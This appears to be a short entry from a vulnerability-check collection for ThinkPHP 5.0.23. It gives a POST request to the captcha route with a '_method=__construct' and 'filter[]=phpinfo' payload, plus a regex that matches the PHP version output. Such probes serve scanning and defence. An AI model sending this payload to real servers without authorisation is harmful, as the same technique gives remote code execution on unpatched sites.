# thinkphp5023

thinkphp5023 ｜ 其他 ｜ —
- **请求**：`POST /index.php?s=captcha HTTP/1.1`

**Payload**
```
_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1
```
- **响应特征**：-1 ^(?=.*?PHP)(?=.*?Version).*?$